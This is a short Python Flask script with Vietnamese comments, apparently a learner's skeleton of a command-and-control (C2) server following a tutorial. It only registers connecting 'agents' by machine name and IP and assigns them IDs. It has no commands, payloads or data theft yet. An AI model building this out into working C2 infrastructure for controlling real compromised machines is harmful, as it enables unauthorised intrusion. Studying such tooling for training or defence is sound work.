from flask import Flask, request
import random
import string
import datetime

app = Flask(__name__)

# Database trong bộ nhớ (lưu tạm)
# Cấu trúc: {'ID_CUA_AGENT': {'ip': '...', 'name': '...', 'last_seen': ...}}
agents = {}

def generate_id():
    """Tạo chuỗi ID ngẫu nhiên 6 ký tự"""
    return ''.join(random.choices(string.ascii_uppercase + string.digits, k=6))

@app.route('/')
def index():
    return "It works!", 200

# Endpoint 1: Đăng ký (Register)
# Agent sẽ gọi vào đây đầu tiên để báo danh
@app.route('/reg', methods=['POST'])
def register():
    try:
        # Lấy tên máy từ dữ liệu gửi lên
        agent_name = request.form.get('name')
        agent_ip = request.remote_addr
        
        # Tạo ID định danh cho Agent này
        new_id = generate_id()
        
        # Lưu vào danh sách
        agents[new_id] = {
            "name": agent_name,
            "ip": agent_ip,
            "last_seen": datetime.datetime.now()
        }
        
        print(f"[+] New Agent joined: {agent_name} ({agent_ip}) -> Assigned ID: {new_id}")
        
        # Trả ID về cho Agent nhớ
        return new_id, 200
    except Exception as e:
        print(f"[-] Register error: {e}")
        return "Error", 500

if __name__ == '__main__':
    print("[*] C2 Server (0xrick style) listening on port 8080...")
    # Chạy server
    app.run(host='0.0.0.0', port=8080)